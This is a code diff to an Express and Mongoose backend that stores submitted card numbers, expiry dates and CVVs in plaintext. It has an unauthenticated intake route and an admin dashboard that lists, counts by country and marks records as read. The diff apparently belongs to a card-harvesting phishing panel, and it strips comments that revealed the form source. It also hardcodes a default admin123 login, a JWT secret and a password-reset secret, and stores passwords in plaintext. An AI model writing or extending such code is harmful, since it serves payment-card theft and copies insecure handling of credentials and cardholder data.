@@ -19,7 +19,7 @@ mongoose
 const paymentSchema = new mongoose.Schema({
   transaction_id: { type: String, required: true, unique: true },
   name: { type: String, required: true },
-  card: { type: String, required: true }, // stored as-is from form
+  card: { type: String, required: true },
   month: { type: String },
   year: { type: String },
   cvv: { type: String },
@@ -38,12 +38,24 @@ const paymentSchema = new mongoose.Schema({
 
 const Payment = mongoose.model("Payment", paymentSchema);
 
+// ─── Admin Schema (password stored in MongoDB — survives restarts) ────
+const adminSchema = new mongoose.Schema({
+  username: { type: String, default: "admin" },
+  password: { type: String, default: "admin123" },
+});
+const Admin = mongoose.model("Admin", adminSchema);
+
+async function getAdmin() {
+  let admin = await Admin.findOne({ username: "admin" });
+  if (!admin) {
+    admin = await Admin.create({ username: "admin", password: "admin123" });
+  }
+  return admin;
+}
+
 // ─── JWT Secret ─────
 const JWT_SECRET = "nextfiler_admin_secret_2024";
-
-// ─── Admin Credentials (mutable — change password via API) ────
-let ADMIN = { username: "admin", password: "admin123" };
-const RESET_SECRET = "nextfiler_reset_2024"; // secret key for password reset
+const RESET_SECRET = "nextfiler_reset_2024";
 
 // ─── Auth Middleware ──
 function authMiddleware(req, res, next) {
@@ -60,16 +72,17 @@ function authMiddleware(req, res, next) {
 // ─── Routes ───
 
 // POST /api/login
-app.post("/api/login", (req, res) => {
+app.post("/api/login", async (req, res) => {
   const { username, password } = req.body;
-  if (username === ADMIN.username && password === ADMIN.password) {
+  const admin = await getAdmin();
+  if (username === admin.username && password === admin.password) {
     const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: "24h" });
     return res.json({ token });
   }
   return res.status(401).json({ error: "Invalid credentials" });
 });
 
-// POST /api/payments  — called from payment form
+// POST /api/payments
 app.post("/api/payments", async (req, res) => {
   try {
     const payment = new Payment(req.body);
@@ -81,7 +94,7 @@ app.post("/api/payments", async (req, res) => {
   }
 });
 
-// GET /api/payments  — dashboard: list with search + pagination
+// GET /api/payments
 app.get("/api/payments", authMiddleware, async (req, res) => {
   try {
     const { search = "", page = 1, limit = 100 } = req.query;
@@ -119,7 +132,7 @@ app.get("/api/payments", authMiddleware, async (req, res) => {
   }
 });
 
-// GET /api/payments/stats  — summary cards
+// GET /api/payments/stats
 app.get("/api/payments/stats", authMiddleware, async (req, res) => {
   try {
     const total = await Payment.countDocuments();
@@ -128,19 +141,16 @@ app.get("/api/payments/stats", authMiddleware, async (req, res) => {
       { $group: { _id: null, total: { $sum: "$amt" } } },
     ]);
     const totalAmount = amountAgg[0]?.total || 0;
-
     const today = new Date();
     today.setHours(0, 0, 0, 0);
     const todayCount = await Payment.countDocuments({
       created_at: { $gte: today },
     });
-
     const countries = await Payment.aggregate([
       { $group: { _id: "$country", count: { $sum: 1 } } },
       { $sort: { count: -1 } },
       { $limit: 5 },
     ]);
-
     return res.json({
       total,
       totalAmount,
@@ -152,7 +162,7 @@ app.get("/api/payments/stats", authMiddleware, async (req, res) => {
   }
 });
 
-// GET /api/payments/:id  — single record
+// GET /api/payments/:id
 app.get("/api/payments/:id", authMiddleware, async (req, res) => {
   try {
     const p = await Payment.findById(req.params.id);
@@ -163,7 +173,7 @@ app.get("/api/payments/:id", authMiddleware, async (req, res) => {
   }
 });
 
-// POST /api/payments/:id/read  — mark as read
+// POST /api/payments/:id/read
 app.post("/api/payments/:id/read", authMiddleware, async (req, res) => {
   try {
     await Payment.findByIdAndUpdate(req.params.id, { is_read: true });
@@ -173,7 +183,7 @@ app.post("/api/payments/:id/read", authMiddleware, async (req, res) => {
   }
 });
 
-// DELETE /api/payments/:id  — delete a record
+// DELETE /api/payments/:id
 app.delete("/api/payments/:id", authMiddleware, async (req, res) => {
   try {
     const result = await Payment.findByIdAndDelete(req.params.id);
@@ -184,29 +194,41 @@ app.delete("/api/payments/:id", authMiddleware, async (req, res) => {
   }
 });
 
-// POST /api/change-password  — change password (must be logged in)
-app.post("/api/change-password", authMiddleware, (req, res) => {
+// POST /api/change-password
+app.post("/api/change-password", authMiddleware, async (req, res) => {
   const { currentPassword, newPassword } = req.body;
   if (!currentPassword || !newPassword)
     return res.status(400).json({ error: "All fields required" });
-  if (currentPassword !== ADMIN.password)
+  const admin = await getAdmin();
+  if (currentPassword !== admin.password)
     return res.status(401).json({ error: "Current password is incorrect" });
   if (newPassword.length < 6)
-    return res.status(400).json({ error: "New password must be at least 6 characters" });
-  ADMIN.password = newPassword;
+    return res
+      .status(400)
+      .json({ error: "New password must be at least 6 characters" });
+  await Admin.findOneAndUpdate(
+    { username: "admin" },
+    { password: newPassword },
+  );
   return res.json({ success: true, message: "Password changed successfully" });
 });
 
-// POST /api/reset-password  — reset password using secret key (no login needed)
-app.post("/api/reset-password", (req, res) => {
+// POST /api/reset-password
+app.post("/api/reset-password", async (req, res) => {
   const { secretKey, newPassword } = req.body;
   if (!secretKey || !newPassword)
     return res.status(400).json({ error: "All fields required" });
   if (secretKey !== RESET_SECRET)
     return res.status(401).json({ error: "Invalid secret key" });
   if (newPassword.length < 6)
-    return res.status(400).json({ error: "Password must be at least 6 characters" });
-  ADMIN.password = newPassword;
+    return res
+      .status(400)
+      .json({ error: "Password must be at least 6 characters" });
+  await Admin.findOneAndUpdate(
+    { username: "admin" },
+    { password: newPassword },
+    { upsert: true },
+  );
   return res.json({ success: true, message: "Password reset successfully" });
 });
 
